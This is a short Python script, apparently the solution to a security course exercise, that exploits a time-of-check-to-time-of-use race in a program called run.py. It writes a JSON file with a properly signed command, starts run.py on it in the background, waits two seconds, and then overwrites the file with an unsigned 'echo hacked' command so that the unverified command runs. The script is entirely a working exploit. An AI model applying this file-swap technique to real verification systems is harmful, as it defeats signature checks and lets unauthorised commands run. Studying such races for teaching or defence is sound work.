import subprocess
import json
import time

signuture_in_bites = "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"
original_json = {"command": "echo cool", "signature": signuture_in_bites}

malicious_input = {"command": "echo hacked", "signature": "hello word"}

def main(argv):
    
    # Creating a proper file that passes the test
    with open("malicious_File.json", "w") as malicious_File:
        malicious_File.write(json.dumps(original_json))
    
    # executing run.py with the file who passes the test
    command = "python3 run.py malicious_File.json &"
    result = subprocess.run(command, shell=True)
    
    
    # Wait 2 seconds for Alice to read the file we created
    time.sleep(2) 
    
    
    # Change the file to the malicious file
    with open("malicious_File.json", "w") as malicious_File:
        malicious_File.write(json.dumps(malicious_input))
    

    # Wait until run.py will finish running
    time.sleep(25)
    

if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
